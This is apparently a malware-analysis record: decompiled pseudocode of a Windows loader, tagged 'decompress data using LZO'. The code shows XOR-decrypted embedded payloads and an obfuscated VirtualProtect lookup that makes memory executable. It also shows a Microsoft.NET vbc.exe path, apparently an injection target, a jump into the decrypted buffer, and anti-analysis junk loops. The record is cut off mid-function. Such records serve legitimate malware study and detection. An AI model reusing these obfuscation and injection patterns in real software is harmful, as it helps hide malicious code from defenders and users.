{
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint entry0(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    char **ppcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint uVar8;\n    bool bVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *unaff_EBX;\n    uchar *unaff_EBP;\n    int32_t unaff_ESI;\n    uint *puVar12;\n    uint *unaff_EDI;\n    int32_t in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint uStack100;\n    uint var_5ch;\n    uint8_t uStack56;\n    uint var_30h;\n    uint var_2ch;\n    uchar *puStack24;\n    uint *var_10h;\n    int32_t iStack16;\n    uint *puStack12;\n    uchar *puStack8;\n    uint uStack4;\n    \n    *0x56b3b8 = 0;\n    iStack16 = 0x4014b2;\n    fcn.00437040();\n    puStack8 = unaff_EBP;\ncode_r0x00401150:\n    puStack24 = &stack0x00000004;\n    puVar3 = &stack0xffffff9c;\n    var_10h = unaff_EBX;\n    iStack16 = unaff_ESI;\n    puStack12 = unaff_EDI;\n    uStack4 = unaff_retaddr;\n    for (iVar10 = 0x11; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (*0x56b3b8 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&stack0xffffff9c);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    unaff_EDI = *(*(in_FS_OFFSET + 0x18) + 4);\n    while( true ) {\n        puVar3 = NULL;\n        LOCK();\n        puVar6 = unaff_EDI;\n        if (*0x56bdf8 != NULL) {\n            puVar3 = *0x56bdf8;\n            puVar6 = *0x56bdf8;\n        }\n        *0x56bdf8 = puVar6;\n        if (puVar3 == NULL) {\n            puVar3 = NULL;\n            goto joined_r0x004013dd;\n        }\n        if (unaff_EDI == puVar3) break;\n        (*pcVar2)(1000);\n    }\n    puVar3 = 0x1;\njoined_r0x004013dd:\n    if (*0x56bdf4 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n    }\n    else if (*0x56bdf4 == 0) {\n        *0x56bdf4 = 1;\n        sub.msvcrt.dll__initterm(0x56d00c, 0x56d018);\n    }\n    else {\n        *0x56b004 = 1;\n    }\n    if (*0x56bdf4 == 1) {\n        sub.msvcrt.dll__initterm(0x56d000, 0x56d008);\n        *0x56bdf4 = 2;\n    }\n    if (puVar3 == NULL) {\n        *0x56bdf8 = puVar3;\n    }\n    if (*0x526a74 != NULL) {\n        (**0x526a74)(0, 2, 0);\n    }\n    fcn.004374d0();\n    *0x56b3cc = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x437750);\n    uStack4 = 0x40123d;\n    fcn.00446fb0();\n    uStack4 = 0x401242;\n    fcn.00437350();\n    *0x56bde8 = 0x400000;\n    uStack4 = 0x401251;\n    ppcVar4 = sub.msvcrt.dll___p__acmdln();\n    unaff_EBX = *0x56b018;\n    pcVar5 = *ppcVar4;\n    bVar9 = false;\n    if (pcVar5 != NULL) {\n        do {\n            cVar1 = *pcVar5;\n            if (cVar1 < '!') {\n                if ((cVar1 == '\\0') || (!bVar9)) goto code_r0x00401290;\n                bVar9 = true;\n            }\n            else if (cVar1 == '\\\"') {\n                bVar9 = bVar9 ^ 1;\n            }\n            pcVar5 = pcVar5 + 1;\n        } while( true );\n    }\n    goto code_r0x004012b4;\ncode_r0x00401290:\n    *0x56bdec = pcVar5;\n    if (cVar1 != '\\0') {\n        do {\n            pcVar5 = pcVar5 + 1;\n            *0x56bdec = pcVar5;\n            if (*pcVar5 == '\\0') break;\n        } while (*pcVar5 < '!');\n    }\ncode_r0x004012b4:\n    if ((*0x56b3b8 != 0) && (*0x4ce000 = 10,  (uStack56 & 1) != 0)) {\n        *0x4ce000 = var_30h;\n    }\n    unaff_ESI = *0x56b018 * 4 + 4;\n    uStack4 = 0x4012e7;\n    puVar6 = sub.msvcrt.dll_malloc();\n    puVar3 = puVar6;\n    if (0 < unaff_EBX) {\n        puVar7 = *0x56b014 + unaff_EBX;\n        puVar12 = *0x56b014;\n        do {\n            puVar11 = puVar3 + 1;\n            unaff_EDI = puVar12 + 1;\n            uStack4 = 0x401320;\n            iVar10 = sub.msvcrt.dll_strlen();\n            unaff_ESI = iVar10 + 1;\n            uStack4 = 0x40132b;\n            uVar8 = sub.msvcrt.dll_malloc();\n            *puVar3 = uVar8;\n            param_1 = *puVar12;\n            uStack4 = 0x401341;\n            param_2 = unaff_ESI;\n            sub.msvcrt.dll_memcpy();\n            puVar3 = puVar11;\n            puVar12 = unaff_EDI;\n        } while (puVar7 != unaff_EDI);\n        puVar3 = puVar6 + unaff_EBX;\n        unaff_EBX = puVar11;\n    }\n    *puVar3 = 0;\n    uStack4 = 0x40135f;\n    *0x56b014 = puVar6;\n    fcn.00437000();\n    *_sym.imp.msvcrt.dll___initenv = *0x56b010;\n    param_2 = *0x56b010;\n    param_1 = *0x56b014;\n    uStack4 = 0x40138b;\n    *0x56b00c = main();\n    if (*0x56b008 != 0) {\n        if (*0x56b004 == 0) {\n            uStack4 = 0x4013ad;\n            sub.msvcrt.dll__cexit();\n        }\n        return *0x56b00c;\n    }\n    uStack4 = 0x401474;\n    unaff_retaddr = *0x56b00c;\n    sub.msvcrt.dll_exit();\n    *0x56b3b8 = 1;\n    iStack16 = 0x401492;\n    fcn.00437040();\n    puStack8 = &stack0xfffffff8;\n    goto code_r0x00401150;\n}\n",
        "token_count": 1821
    },
    "0x43ad42": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid case.0x43ad42.5(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar3 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 283
    },
    "00401590": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00401590(void)\n\n{\n    if (*0x4ce004 != NULL) {\n        (**0x4ce004)(0x52e0f8);\n    }\n    if (*0x56bdf0 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(*0x56bdf0);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "004015ef": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x0040160a)\n// WARNING: Removing unreachable block (ram,0x00401669)\n// WARNING: Removing unreachable block (ram,0x0040169a)\n\nvoid __cdecl fcn.004015ef(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    bool bVar1;\n    uint32_t var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    for (var_10h = 0; var_10h < arg_10h; var_10h = var_10h + 1) {\n        sub.KERNEL32.dll_IsProcessorFeaturePresent(5);\n        *(arg_ch + var_10h) = *(arg_ch + var_10h) ^ ((*(arg_8h + (var_10h % arg_14h >> 2)) * 0xac0) / 0x3f4) * '\\v';\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0040173e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Removing unreachable block (ram,0x0040184d)\n// WARNING: Removing unreachable block (ram,0x004017f8)\n// WARNING: Removing unreachable block (ram,0x00401870)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.0040173e(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch, int32_t arg_20h, \n            uint32_t arg_24h, int32_t arg_28h, uint32_t arg_2ch, int32_t arg_30h, uint arg_34h, uint arg_38h, \n            uint arg_3ch, uint arg_40h, uint noname_15, uint noname_16, uint arg_4ch, uint arg_50h, uint arg_54h, \n            uint noname_20, uint arg_5ch, uint arg_60h, uint arg_64h, uint noname_24, uint arg_6ch, uint arg_70h, \n            uint arg_74h, uint32_t arg_78h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_48h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uint8_t var_19h;\n    uint var_18h;\n    uint32_t var_14h;\n    char var_10h;\n    char var_fh;\n    char var_eh;\n    char var_dh;\n    char var_ch;\n    char var_bh;\n    char var_ah;\n    uint var_9h;\n    \n    var_ah = '\\x01';\n    while (var_ah != '\\0') {\n        var_ah = '\\0';\n    }\n    var_bh = '\\x01';\n    while (var_bh != '\\0') {\n        var_bh = '\\0';\n    }\n    var_ch = '\\x01';\n    while (var_ch != '\\0') {\n        var_ch = '\\0';\n    }\n    var_dh = '\\x01';\n    while (var_dh != '\\0') {\n        var_dh = '\\0';\n    }\n    var_eh = '\\x01';\n    while (var_eh != '\\0') {\n        var_eh = '\\0';\n    }\n    var_fh = '\\x01';\n    while (var_fh != '\\0') {\n        var_fh = '\\0';\n    }\n    var_10h = '\\x01';\n    while (var_10h != '\\0') {\n        var_10h = '\\0';\n    }\n    var_9h._0_1_ = 1;\n    uVar2 = arg_10h * 0x101c;\n    uVar3 = uVar2 * arg_1ch;\n    uVar4 = arg_24h * 0x19c;\n    uVar6 = uVar3 - uVar4;\n    fcn.0048b0c0(arg_2ch + uVar6, \n                 arg_30h + (((arg_1ch * (uVar2 >> 0x1f) + arg_20h * uVar2 + (uVar2 * arg_1ch >> 0x20)) -\n                            (arg_28h * 0x19c + (arg_24h * 0x19c >> 0x20))) - (uVar3 < uVar4)) + CARRY4(arg_2ch, uVar6));\n    var_18h = 0xfb30264a;\n    var_30h._0_1_ = 0xc1;\n    var_30h._1_1_ = 0x97;\n    var_30h._2_1_ = 0xcb;\n    var_30h._3_1_ = 0x88;\n    var_2ch = 0x5b;\n    var_2bh = 0x95;\n    var_2ah = 0xac;\n    var_29h = 0x41;\n    var_28h = 8;\n    var_27h = 0x18;\n    var_26h = 0xa5;\n    var_25h = 0x92;\n    var_24h = 0x92;\n    var_23h = 0x48;\n    var_22h = 0x68;\n    for (var_14h = 0; var_14h < 0xf; var_14h = var_14h + 1) {\n        uVar1 = (*(&var_30h + var_14h) << 6 | (*(&var_30h + var_14h) ^ 0x10) >> 2) - 0x2a;\n        uVar1 = var_14h - ((-(uVar1 * ' ' | uVar1 >> 3) ^ 99) - 0x29 ^ 0xeb);\n        uVar1 = ~(((uVar1 * '\\x04' | uVar1 >> 6) ^ 0x62) - 0xe);\n        var_19h = uVar1 << 7 | uVar1 >> 1;\n        *(&var_30h + var_14h) = var_19h;\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"kerne\", &var_21h);\n    fcn.00483140();\n    fcn.004b29d0(\"l32.dll\");\n    uVar5 = fcn.00454db0();\n    var_20h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar5);\n    var_4ch = 0;\n    *0x56b034 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(var_20h, &var_30h);\n    (**0x56b034)(arg_8h, arg_ch, 0x40, &var_4ch);\n    uVar7 = fcn.00437f00(arg_54h, 0, arg_5ch, arg_60h);\n    fcn.004b2800();\n    return uVar7 & 0xffffffff00000000 | uVar7 ^ arg_78h;\n}\n",
        "token_count": 1681
    },
    "00401bb6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00401bb6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_1ch;\n    uint var_bp_10h;\n    uint var_ch;\n    uint var_bp_4h;\n    \n    iVar1 = fcn.00454f20();\n    uVar2 = fcn.00454db0();\n    if (arg_10h == '\\0') {\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = 0xfde9;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar4, 0, uVar2, iVar1 + 1, 0, 0);\n    fcn.004b5310();\n    fcn.004b3ff0(uVar2);\n    uVar4 = fcn.00455b90();\n    uVar3 = fcn.00454db0();\n    if (arg_10h == '\\0') {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = 0xfde9;\n    }\n    (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar5, 0, uVar3, iVar1 + 1, uVar4, uVar2);\n    return arg_8h;\n}\n",
        "token_count": 346
    },
    "00402366": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: s2\n// WARNING: Removing unreachable block (ram,0x00402682)\n// WARNING: Removing unreachable block (ram,0x00402673)\n// WARNING: Removing unreachable block (ram,0x00402620)\n// WARNING: Removing unreachable block (ram,0x004024d4)\n// WARNING: Removing unreachable block (ram,0x004025f2)\n// WARNING: Removing unreachable block (ram,0x00402630)\n// WARNING: Removing unreachable block (ram,0x00402645)\n// WARNING: Removing unreachable block (ram,0x004026b9)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00402366(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar auStack291508 [291328];\n    uint var_b0h;\n    uint var_98h;\n    uchar var_7dh;\n    uint var_7ch;\n    int32_t var_69h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint uStack72;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_29h;\n    char var_21h;\n    char var_20h;\n    char var_1fh;\n    char var_1eh;\n    uchar var_1dh;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    char var_10h;\n    char var_fh;\n    char var_eh;\n    char var_dh;\n    uint var_ch;\n    uint uStack12;\n    uint s2;\n    \n    uStack12 = 0x402374;\n    iVar1 = fcn.00437ed0();\n    iVar1 = -iVar1;\n    var_29h._0_1_ = 1;\n    var_30h = 0x8a2;\n    var_34h = 0x16b;\n    var_dh = '\\x01';\n    while (var_dh != '\\0') {\n        var_dh = '\\0';\n    }\n    var_eh = '\\x01';\n    while (var_eh != '\\0') {\n        var_eh = '\\0';\n    }\n    var_fh = '\\x01';\n    while (var_fh != '\\0') {\n        var_fh = '\\0';\n    }\n    var_10h = '\\x01';\n    while (var_10h != '\\0') {\n        var_10h = '\\0';\n    }\n    uStack24._3_1_ = '\\x01';\n    while (uStack24._3_1_ != '\\0') {\n        uStack24._3_1_ = '\\0';\n    }\n    var_ch = 0x226f;\n    var_ch = 0xf3e;\n    var_ch = 0xf3e;\n    *(&fcn.00402366::s2 + iVar1) = 5;\n    *(&stack0xfffffff4 + iVar1) = 0x4024f9;\n    sub.KERNEL32.dll_IsProcessorFeaturePresent();\n    var_18h = 0;\n    for (var_1ch = 0; var_1ch < 0x40751; var_1ch = var_1ch + 1) {\n        var_18h = var_18h + 1;\n    }\n    if (var_18h == 0x40751) {\n        *(&stack0xfffffffc + iVar1) = 0x47200;\n        *(&fcn.00402366::s2 + iVar1) = 0x4ce7a0;\n        *(&stack0xfffffff4 + iVar1) = &stack0xfffb8d4c;\n        *(&fcn.00402366::var_ch + iVar1) = 0x402551;\n        sub.msvcrt.dll_memcpy();\n        var_38h = 0;\n        var_3ch = 0;\n        var_40h = 0x590813;\n        *(&fcn.00402366::var_ch + iVar1) = 0x402570;\n        fcn.00483110();\n        *(&fcn.00402366::s2 + iVar1) = &stack0xffffff7f;\n        *(&stack0xfffffff4 + iVar1) = \"C:\\\\Windows\\\\Microsoft.NET\\\\Fra\";\n        *(&fcn.00402366::var_ch + iVar1) = 0x40258b;\n        fcn.004b21e0();\n        *(&stack0xffffffe8 + iVar1) = 0x402598;\n        fcn.00483140();\n        *(&stack0xffffffec + iVar1) = \"mework\\\\v4.0.30319\\\\vbc.exe\";\n        *(&stack0xffffffe8 + iVar1) = 0x4025ac;\n        fcn.004b29d0();\n        uStack72 = *0x519290;\n        var_48h = 0;\n        var_4ch = 0x101b;\n        var_58h = 0x950075;\n        var_54h = 0;\n        var_1eh = '\\x01';\n        while (var_1eh != '\\0') {\n            var_1eh = '\\0';\n        }\n        var_1fh = '\\x01';\n        while (var_1fh != '\\0') {\n            var_1fh = '\\0';\n        }\n        var_20h = '\\x01';\n        while (var_20h != '\\0') {\n            var_20h = '\\0';\n        }\n        var_21h = '\\x01';\n        while (var_21h != '\\0') {\n            var_21h = '\\0';\n        }\n        var_1dh = 0;\n        *(&stack0x00000058 + iVar1) = 0x4f8d53;\n        *(&stack0x00000050 + iVar1) = 0x9da0d;\n        *(&stack0x00000054 + iVar1) = 0;\n        *(&stack0x0000004c + iVar1) = 0x5a;\n        *(&stack0x00000048 + iVar1) = 0x9fd3e;\n        *(&stack0x00000044 + iVar1) = 0x4afc;\n        *(&stack0x0000003c + iVar1) = 0x8f7a6;\n        *(&stack0x00000040 + iVar1) = 0;\n        *(&stack0x00000038 + iVar1) = 0x4e72fa;\n        *(&stack0x00000034 + iVar1) = 0x74d85d;\n        *(&stack0x0000002c + iVar1) = 0xfe61;\n        *(&stack0x00000030 + iVar1) = 0;\n        *(&stack0x00000028 + iVar1) = 0x12342;\n        *(&stack0x00000024 + iVar1) = 0xb8bac;\n        *(&fcn.00402366::arg_20h + iVar1) = 0;\n        *(&fcn.00402366::arg_1ch + iVar1) = 0x7742;\n        *(&fcn.00402366::arg_18h + iVar1) = 0xcd;\n        *(&fcn.00402366::arg_10h + iVar1) = 0x283;\n        *(&fcn.00402366::arg_14h + iVar1) = 0;\n        *(&fcn.00402366::arg_8h + iVar1) = 0x21e4;\n        *(&fcn.00402366::arg_ch + iVar1) = 0;\n        *(&stack0xfffffffc + iVar1) = 0x30d;\n        *(&stack0x00000000 + iVar1) = 0;\n        *(&stack0xfffffff4 + iVar1) = _str._np;\n        *(&fcn.00402366::var_ch + iVar1) = 0x299;\n        *(&stack0xffffffec + iVar1) = 0x77e;\n        *(&stack0xffffffe8 + iVar1) = 0x4ce020;\n        *(&fcn.00402366::var_18h + iVar1) = 0x40279f;\n        _var_60h = fcn.0040173e(*(&stack0xffffffe8 + iVar1), *(&stack0xffffffec + iVar1), \n                                *(&fcn.00402366::var_ch + iVar1), *(&stack0xfffffff4 + iVar1), \n                                *(&fcn.00402366::s2 + iVar1), *(&stack0xfffffffc + iVar1), *(&stack0x00000000 + iVar1), \n                                *(&fcn.00402366::arg_8h + iVar1), *(&fcn.00402366::arg_ch + iVar1), \n                                *(&fcn.00402366::arg_10h + iVar1), *(&fcn.00402366::arg_14h + iVar1), \n                                *(&fcn.00402366::arg_18h + iVar1), *(&fcn.00402366::arg_1ch + iVar1), \n                                *(&fcn.00402366::arg_20h + iVar1), *(&fcn.00402366::arg_24h + iVar1), \n                                *(&stack0x00000024 + iVar1), *(&stack0x00000028 + iVar1), *(&stack0x0000002c + iVar1), \n                                *(&stack0x00000030 + iVar1), *(&stack0x00000034 + iVar1), *(&stack0x00000038 + iVar1), \n                                *(&stack0x0000003c + iVar1), *(&stack0x00000040 + iVar1), *(&stack0x00000044 + iVar1), \n                                *(&stack0x00000048 + iVar1), *(&stack0x0000004c + iVar1), *(&stack0x00000050 + iVar1), \n                                *(&stack0x00000054 + iVar1), *(&stack0x00000058 + iVar1));\n        *(&stack0xfffffff4 + iVar1) = 0x5b;\n        *(&fcn.00402366::var_ch + iVar1) = 0x77e;\n        *(&stack0xffffffec + iVar1) = 0x4ce020;\n        *(&stack0xffffffe8 + iVar1) =\n             \"ryy6u9x6qFf1C9uGzZEZkL3R2oUz70wsSsoAV0SdpRDX5LnDCSYJVmbBNaTDU8zJRd9JzfitobkgSj4pKJ0xNX8w67\";\n        *(&fcn.00402366::var_18h + iVar1) = 0x4027c9;\n        fcn.004015ef(*(&stack0xffffffe8 + iVar1), *(&stack0xffffffec + iVar1), *(&fcn.00402366::var_ch + iVar1), \n                     *(&stack0xfffffff4 + iVar1));\n        *(&fcn.00402366::var_ch + iVar1) = 1;\n        *(&stack0xffffffec + iVar1) = &fcn.00402366::var_98h;\n        *(&stack0xffffffe8 + iVar1) = &fcn.00402366::var_b0h;\n        *(&fcn.00402366::var_18h + iVar1) = 0x4027e9;\n        fcn.00401bb6(*(&stack0xffffffe8 + iVar1), *(&stack0xffffffec + iVar1), *(&fcn.00402366::var_ch + iVar1));\n        *(&fcn.00402366::var_18h + iVar1) = 0x4027f6;\n        var_64h = fcn.00455b90();\n        *(&fcn.00402366::var_18h + iVar1) = 0x4027fe;\n        *NULL = fcn.00401b7c();\n        *(&stack0xfffffff4 + iVar1) = 0x5b;\n        *(&fcn.00402366::var_ch + iVar1) = 0x47200;\n        *(&stack0xffffffec + iVar1) = &stack0xfffb8d4c;\n        *(&stack0xffffffe8 + iVar1) =\n             \"R2v9qXwKNhgOu2jYnbWZHRLs9JJL1m28QX7SBLxXtJeCn50LeRQKsCiKaBAjdr8lh4u5AKXJEg97bHgjgKyLkBLQHK\";\n        *(&fcn.00402366::var_18h + iVar1) = 0x402827;\n        fcn.004015ef(*(&stack0xffffffe8 + iVar1), *(&stack0xffffffec + iVar1), *(&fcn.00402366::var_ch + iVar1), \n                     *(&stack0xfffffff4 + iVar1));\n        *(&fcn.00402366::s2 + iVar1) = 0x876512;\n        *(&stack0xfffffff4 + iVar1) = 0x656736;\n        *(&fcn.00402366::var_ch + iVar1) = &stack0xfffb8d4c;\n        *(&stack0xffffffec + iVar1) = 0;\n        *(&stack0xffffffe8 + iVar1) = var_64h;\n        puVar3 = &fcn.00402366::var_18h + iVar1;\n        *(&fcn.00402366::var_18h + iVar1) = 0x40285b;\n        (*(stack0xffffff94 + 0x4ce020))();\n        uVar2 = 0;\n        *(puVar3 + -4) = 0x40286d;\n        fcn.004b5710();\n        *(puVar3 + -4) = 0x40287a;\n        fcn.004b2800();\n    }\n    else {\n        for (stack0xffffffd4 = 0x4c; 0 < stack0xffffffd4; unique0x00007a80 = stack0xffffffd4 + -1) {\n        }\n        uVar2 = 0xf983;\n    }\n    return uVar2;\n}\n",
        "token_count": 3338
    },
    "00402b42": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00402b42(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint size;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    for (var_ch = 0; var_ch < 0x5fbf; var_ch = var_ch + 1) {\n        sub.KERNEL32.dll_IsProcessorFeaturePresent(5);\n        sub.msvcrt.dll_malloc(0x1618);\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004015cc, 0, 0, 0);\n    }\n    for (var_10h = 0xe; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x1c; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    return 0xc3a7;\n}\n",
        "token_count": 366
    },
    "00405890": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.00405890(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_3bch;\n    uint var_3b0h;\n    uint var_395h;\n    uint var_379h;\n    uint var_360h;\n    uint var_345h;\n    uint var_32ch;\n    uint var_311h;\n    uint var_2f5h;\n    uint var_2d9h;\n    uint var_2bdh;\n    uint var_2a1h;\n    uint var_285h;\n    uint var_269h;\n    uint var_24dh;\n    uint var_231h;\n    uint var_215h;\n    uint var_1fch;\n    uint var_1e1h;\n    uint var_1c5h;\n    uint var_1a9h;\n    uint var_18dh;\n    uint var_171h;\n    uint var_155h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_94h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"niagigwbcmbotakeyswqxlzlst\", &var_395h);\n    fcn.00483110();\n    fcn.004b21e0(\"wzjenorymgxgdqvbumezlkyrnaylrb\", &var_379h);\n    fcn.00405360(*0x519510, *0x519510 >> 0x20, 1, 0x286, &var_395h + 1, *0x519508, *0x519508 >> 0x20, 0, &var_3b0h, \n                 0xacd, *0x519500, *0x519500 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00405406(param_1, *0x519528, *0x519528 >> 0x20, 0, *0x519520, *0x519520 >> 0x20, &var_360h, *0x519518, \n                 *0x519518 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004054ce(*0x519538, *0x519538 >> 0x20, *0x519530, *0x519530 >> 0x20, 0x66b, 0);\n    fcn.00483110();\n    fcn.004b21e0(\"neksywakhrjwjwelenoaihcopqxn\", &var_311h);\n    fcn.004055d6(param_1, 1, *0x519558, *0x519558 >> 0x20, 0x1518, *0x519550, *0x519550 >> 0x20, 0x184b, *0x519548, \n                 *0x519548 >> 0x20, 1, &var_32ch, 0, *0x519540, *0x519540 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"skvupssvsowcchnzutwxgviisbsyyatnhtknetkhovmmim\", &var_2f5h);\n    fcn.00405832(0x44c, 0, *0x519568, *0x519568 >> 0x20, *0x519560, *0x519560 >> 0x20, 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00404294(&var_2bdh + 1, *0x519580, *0x519580 >> 0x20, *0x519578, *0x519578 >> 0x20, *0x519570, *0x519570 >> 0x20\n                );\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004042ce(0x98b, *0x519588, *0x519588 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"jelhvmcyeuyagrmiihsnhofvwrkhpnogpvrgjrjomaqadgetsjmzbcadsmbqgajdahhqjeskpshkvgdhultenxyjxqxbx\", \n                 &var_285h);\n    fcn.00404794(&var_2a1h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dodcffltxpyfwypruuiqtvoloeatgkyokzhhsypxlbqfsassaivndzmonopflyotrdmsjjoekxuppcvskhlmgvfcposzvtfjoyhp\"\n                 , &var_269h);\n    fcn.00483110();\n    